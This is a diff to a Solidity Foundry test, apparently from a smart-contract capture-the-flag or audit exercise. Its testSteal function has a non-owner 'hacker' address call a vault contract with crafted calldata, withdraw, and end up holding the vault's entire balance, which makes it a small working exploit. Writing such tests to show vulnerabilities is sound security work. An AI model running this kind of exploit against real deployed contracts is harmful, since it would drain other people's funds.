@@ -18,12 +18,15 @@ contract VaultTest is Test {
 
     function testSteal() public {
         // non-owner will now steal it
-        deal(address(1), 1);
+        address hacker = payable(address(1));
+        deal(hacker, 1);
         uint256 vaultBalance = address(vault).balance;
-        vm.startPrank(address(1));
-        bytes memory data = abi.encodeWithSelector(bytes4(0x69696969), 0x46);
+        vm.startPrank(hacker);
+        bytes memory data = abi.encodeWithSelector(bytes4(0xd0e30db0), hacker);
         (bool success, ) = address(vault).call{value: 1}(data);
-        assertEq(vaultBalance, address(1).balance - 1);
+        require(success);
+        vault.withdraw();
+        assertEq(vaultBalance, hacker.balance - 1);
     }
 }
 
@@ -32,7 +35,7 @@ interface IVault {
 
     function setOwner(address) external returns (bool);
 
-    function deposit() external;
+    function deposit() payable external;
 
     function withdraw() external;
 }
